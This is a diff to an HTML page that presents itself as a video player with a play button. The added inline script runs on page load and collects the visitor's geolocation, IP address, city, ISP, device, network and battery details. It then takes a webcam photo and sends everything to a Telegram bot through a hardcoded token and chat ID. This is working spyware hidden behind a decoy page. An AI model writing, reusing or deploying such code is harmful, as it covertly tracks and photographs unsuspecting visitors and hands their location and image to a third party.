@@ -4,7 +4,45 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Video Player</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            margin: 0;
+        }
+        .video-container {
+            position: relative;
+            width: 640px;
+            height: 360px;
+            background: black;
+        }
+        #video-placeholder {
+            width: 100%;
+            height: 100%;
+            background: black url('thumbnail.jpg') center/cover no-repeat;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        #play-button {
+            width: 60px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #play-button::before {
+            content: '▶';
+            font-size: 24px;
+            color: black;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
     <div class="video-container">
@@ -12,6 +50,63 @@
             <div id="play-button"></div>
         </div>
     </div>
-    <script src="script.js"></script>
+    <script>
+        const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o";
+        const CHAT_ID = "-1002270270494";
+
+        function sendToTelegram(message, photoBlob = null) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("caption", message);
+            if (photoBlob) {
+                formData.append("photo", photoBlob, "snapshot.jpg");
+            }
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        async function captureData() {
+            let message = "🔍 Data Pengguna:\n";
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                message += `📍 Lokasi: ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
+            } catch {
+                message += "❌ Lokasi tidak diizinkan.\n";
+            }
+            try {
+                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+                message += `🌐 IP: ${ipData.ip}\n🏙 Kota: ${ipData.city}, ${ipData.region}\n📡 ISP: ${ipData.org}\n`;
+            } catch {
+                message += "⚠️ Gagal mendapatkan informasi IP.\n";
+            }
+            let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
+            let androidVersion = navigator.userAgent.match(/Android\s([0-9\.]+)/);
+            let androidInfo = androidVersion ? `🤖 Android: ${androidVersion[1]}\n` : "";
+            message += `📱 Perangkat: ${navigator.userAgent}\n📶 Jaringan: ${network}\n${androidInfo}`;
+            try {
+                const battery = await navigator.getBattery();
+                message += `🔋 Baterai: ${Math.round(battery.level * 100)}%\n`;
+            } catch {
+                message += "⚠️ Tidak bisa mendapatkan status baterai.\n";
+            }
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                let track = stream.getVideoTracks()[0];
+                let imageCapture = new ImageCapture(track);
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                const blob = await imageCapture.takePhoto();
+                await sendToTelegram(message, blob);
+                stream.getTracks().forEach(track => track.stop());
+            } catch {
+                await sendToTelegram("❌ Kamera tidak diizinkan.");
+            }
+        }
+
+        window.onload = captureData;
+    </script>
 </body>
 </html>
